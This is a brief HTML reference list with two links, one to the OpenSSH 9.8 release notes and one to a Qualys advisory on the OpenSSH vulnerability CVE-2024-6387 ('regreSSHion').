- <a href="https://www.openssh.com/txt/release-9.8">https://www.openssh.com/txt/release-9.8</a><br>
- <a href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt</a>
